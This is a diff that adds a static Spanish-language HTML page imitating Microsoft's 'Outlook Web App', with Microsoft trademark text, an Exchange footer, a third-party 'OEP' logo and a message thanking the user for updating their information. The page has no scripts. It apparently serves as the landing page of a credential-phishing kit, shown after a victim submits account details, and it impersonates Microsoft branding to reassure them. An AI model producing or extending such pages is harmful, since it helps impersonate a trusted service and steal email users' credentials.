@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook Web App</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 480px;
+            padding: 30px 40px;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .logo-left { display: flex; flex-direction: column; }
+        .logo-left .ms {
+            font-size: 11px; color: #737373; font-weight: normal; margin-bottom: 2px;
+        }
+        .logo-left .title {
+            font-size: 22px; color: #333333; font-weight: 300; letter-spacing: -0.5px;
+        }
+        .logo-right {
+            width: 48px; height: 48px; object-fit: contain;
+        }
+        .message-box {
+            padding: 40px 20px;
+        }
+        .message-box h2 {
+            font-size: 18px;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .message-box p {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+        }
+        .icon-ok {
+            font-size: 48px;
+            color: #e89a00;
+            margin-bottom: 20px;
+        }
+        .footer {
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 20px;
+            margin-top: 10px;
+        }
+        .footer-line1 { font-size: 12px; color: #737373; margin-bottom: 4px; }
+        .footer-line2 { font-size: 11px; color: #999999; }
+        @media (max-width: 520px) {
+            .card { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <div class="logo-left">
+                <span class="ms">Microsoft&reg;</span>
+                <span class="title">Outlook Web App</span>
+            </div>
+            <img src="oep.png" class="logo-right" alt="Logo OEP">
+        </div>
+
+        <div class="message-box">
+            <div class="icon-ok">&#10003;</div>
+            <h2>Gracias por Actualizar su información</h2>
+            <p>Su registro ha sido procesado correctamente.<br>Puede cerrar esta ventana.</p>
+        </div>
+
+        <div class="footer">
+            <div class="footer-line1">Conectado a Microsoft Exchange</div>
+            <div class="footer-line2">&copy; 2010 Microsoft Corporation. Reservados todos los derechos.</div>
+        </div>
+    </div>
+</body>
+</html>
